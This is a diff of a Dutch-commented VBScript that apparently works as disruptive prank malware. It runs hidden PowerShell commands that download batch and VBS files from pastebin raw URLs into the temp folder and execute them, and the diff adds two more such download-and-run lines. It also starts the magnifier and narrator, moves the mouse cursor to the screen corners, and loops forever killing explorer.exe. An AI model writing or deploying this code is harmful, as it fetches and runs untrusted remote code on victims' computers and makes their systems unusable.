@@ -2,7 +2,7 @@ Set WshShell = CreateObject("WScript.Shell")
 
 ' Download en start pingyoutube.bat
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/wCbsqrNY','%TEMP%\pingyoutube.bat'); Start-Process '%TEMP%\pingyoutube.bat'""", 0, False
-WScript.Sleep 2000
+WScript.Sleep 1250
 
 ' Start vergrootglas
 WshShell.Run "magnify.exe", 1, False
@@ -18,16 +18,20 @@ WshShell.Run "narrator", 0, False
 
 ' Download en start relaunchping.bat
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/TiNThhxW','%TEMP%\relaunchping.bat'); Start-Process '%TEMP%\relaunchping.bat'""", 0, False
-WScript.Sleep 5000
+WScript.Sleep 3000
 
 ' Beweeg muis naar 4 hoeken (PowerShell één regel)
 moveCmd = "powershell -w hidden -command ""Add-Type -AssemblyName System.Windows.Forms; $pos=@(@{X=0;Y=0},@{X=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width;Y=0},@{X=0;Y=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height},@{X=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width;Y=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height}); foreach ($p in $pos) {[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($p.X,$p.Y); Start-Sleep -Milliseconds 300}"""
 
 WshShell.Run moveCmd, 0, False
 
-WScript.Sleep 5000
+WScript.Sleep 3000
 
-' Oneindige loop (voorbeeld)
+WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/NfhDWkdS','%TEMP%\mousemove.vbs'); Start-Process '%TEMP%\mousemove.vbs'""", 0, False
+
+WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/tLYqCwJQ','%TEMP%\soundloop.vbs')""", 0, True
+WshShell.Run "wscript.exe %TEMP%\soundloop.vbs", 0, False
+
 Do
     WshShell.Run "taskkill /f /im explorer.exe", 0, False
     WScript.Sleep 1000
